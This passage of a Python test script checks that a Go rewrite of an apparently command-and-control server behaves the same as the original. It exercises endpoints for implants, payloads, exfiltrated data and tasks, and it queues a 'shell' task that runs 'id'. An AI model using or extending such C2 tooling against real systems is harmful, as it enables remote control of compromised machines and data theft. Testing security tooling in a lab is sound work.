    cmp_case("exfil missing id", "GET", "/api/dashboard/exfil/", headers=gtok)
    cmp_case("exfil id", "GET", "/api/dashboard/exfil/abc", headers=gtok)
    cmp_case("payload list", "GET", "/api/dashboard/payloads", headers=gtok)
    cmp_case("create task wrong method", "GET", "/api/dashboard/task", headers=gtok)
    cmp_case("bad bearer token", "GET", "/api/dashboard/implants",
             headers={"Authorization": "Bearer nope"})
    cmp_case("bad cookie token", "GET", "/api/dashboard/implants", headers={"Cookie": "token=nope"})

    gs, gb, _ = req(gport, "POST", "/api/dashboard/task",
                    '{"implant_id":"imp1","type":"shell","payload":{"cmd":"id"}}', gtok)
    cs, cb, _ = req(cport, "POST", "/api/dashboard/task",
                    '{"implant_id":"imp1","type":"shell","payload":{"cmd":"id"}}', ctok)
    if gs != 200 or cs != 200 or norm(gb) != norm(cb):
        print("  FAIL task create: go=%r snake=%r" % (gb, cb))
        fails += 1
    cmp_case("pending tasks list", "GET", "/api/dashboard/tasks/imp1", headers=gtok)
    cmp_case("tasks marked delivered", "GET", "/api/dashboard/tasks/imp1", headers=gtok)

    gs, gb, _ = req(gport, "GET", "/dashboard", headers=gtok)
    cs, cb, _ = req(cport, "GET", "/dashboard", headers=ctok)
    if gs != 200 or cs != 200 or gb != cb:
        print("  FAIL dashboard asset: go=%s/%d bytes snake=%s/%d bytes" %
              (gs, len(gb), cs, len(cb)))
        fails += 1

    def claims(tok):
        import base64, hashlib, hmac
        def dec(part):
            return json.loads(base64.urlsafe_b64decode(part + "==" * 3))
        h, p, s = tok.split(".")
        sig = hmac.new(bytes.fromhex(KEY), ("%s.%s" % (h, p)).encode(), hashlib.sha256).digest()
        ok = base64.urlsafe_b64encode(sig).rstrip(b"=").decode() == s
        return dec(h), dec(p), ok
    gh, gp, gok = claims(gt)
    ch, cp, cok = claims(ct)
    if not (gok and cok) or gh != ch or sorted(gp) != sorted(cp) or gp["sub"] != cp["sub"]:
        print("  FAIL jwt: go=%r/%r snake=%r/%r" % (gh, gp, ch, cp))
        fails += 1
    if gp["exp"] - gp["iat"] != 24 * 3600 or cp["exp"] - cp["iat"] != 24 * 3600:
        print("  FAIL jwt lifetime: go=%r snake=%r" % (gp, cp))
        fails += 1

    rows = {}
    for name, wd in (("go", "go"), ("snake", "snake")):
        with sqlite3.connect(os.path.join(work, wd, "data", "c2.db")) as db:
            rows[name] = db.execute(
                "SELECT implant_id, data_type, data, channel FROM exfil_data").
